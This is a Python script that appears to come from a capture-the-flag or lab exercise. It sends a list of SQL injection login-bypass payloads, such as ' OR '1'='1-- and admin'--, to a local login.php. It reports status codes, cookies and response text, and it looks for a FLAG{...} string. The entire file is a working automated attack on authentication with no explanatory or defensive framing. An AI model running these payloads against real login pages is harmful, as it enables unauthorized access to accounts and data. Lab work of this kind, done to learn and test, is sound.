import requests
import re
import sys

target_url = "http://127.0.0.1:33168/login.php"
payloads = [
    "' OR '1'='1--",
    "admin'--",
    "' OR 1=1#",
    "' OR '1'='1' LIMIT 1--",
    "' OR '1'='1'",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR '1'='1'#",
    "admin' OR '1'='1",
    "' AND 1=1--",
]

print(f"Testing SQL injection on {target_url}\n")

for payload in payloads:
    try:
        data = {'username': payload, 'password': ''}
        response = requests.post(target_url, data=data, timeout=15)
        
        status = response.status_code
        length = len(response.content)
        cookies = dict(response.cookies)
        
        # Check for flag
        flag = re.search(r'FLAG\{[^}]+\}', response.text)
        
        print(f"Payload: {payload}")
        print(f"  Status: {status} | Length: {length}B")
        
        if cookies:
            print(f"  Cookies SET: {cookies}")
        
        if flag:
            print(f"  [!] FLAG FOUND: {flag.group()}")
            print(f"  Full response:\n{response.text}")
        elif "welcome" in response.text.lower() or "dashboard" in response.text.lower():
            print(f"  [+] Welcome/Dashboard detected!")
            print(f"  Response preview: {response.text[:200]}")
        elif "error" in response.text.lower() or "invalid" in response.text.lower():
            print(f"  [-] Error message (likely failed)")
        else:
            print(f"  [?] Response: {response.text[:150]}")
        
        print("-" * 80)
        
    except Exception as e:
        print(f"Error with payload {payload}: {str(e)}")
        print("-" * 80)

print("\n[*] Test complete")
